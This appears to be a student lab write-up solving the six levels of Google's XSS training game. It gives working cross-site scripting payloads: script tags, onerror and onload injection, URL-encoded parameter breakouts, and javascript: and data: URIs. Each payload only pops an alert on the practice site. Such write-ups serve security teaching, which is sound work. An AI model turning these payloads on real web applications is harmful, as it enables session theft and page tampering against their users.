# SI-Lab3
**Task:** XSS vulnerability exploiting.

**Example used:** https://xss-game.appspot.com

###Task 1

![ScreenShot](1.png)

```javascript
<script>alert('hello xss')</script>
```

![ScreenShot](2.png)

###Task 2

![ScreenShot](3.png)

```javascript
<img src="something.png" onerror="javascript:alert('hello Xss2')"/>
```

![ScreenShot](4.png)

###Task 3

The vulnerability was at inputting an image which doesn't exist.

![ScreenShot](5.png)

```javascript
function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
```

In the Address bar

```
https://xss-game.appspot.com/level3/frame#4'onerror="javascript:alert('hello xss3')"
```

![ScreenShot](6.png)

###Task 4

![ScreenShot](7.png)

Vulnerability found on

```
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```

And with the help of https://www.w3schools.com/tags/ref_urlencode.asp HTML URL encoding i was able to inject code in javascript

```
https://xss-game.appspot.com/level4/frame?timer=')%3Balert('hello Xsss4')%3Bvar b=('
```

![ScreenShot](8.png)

###Task 5

![ScreenShot](9.png)

Vulnerability found on 

```javascript
<script>
  setTimeout(function() { window.location = '{{ next }}'; }, 5000);
</script>
```

```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('hello xss4')
```

And by pressing next now it will alert with our notification.

![ScreenShot](10.png)

###Task 6

![ScreenShot](11.png)

I exploited the vulnerability of data uri meaning the way we create http requests for files

```
https://xss-game.appspot.com/level6/frame#data:javascript,alert('hello xss6')
```

![ScreenShot](12.png)

![ScreenShot](13.png)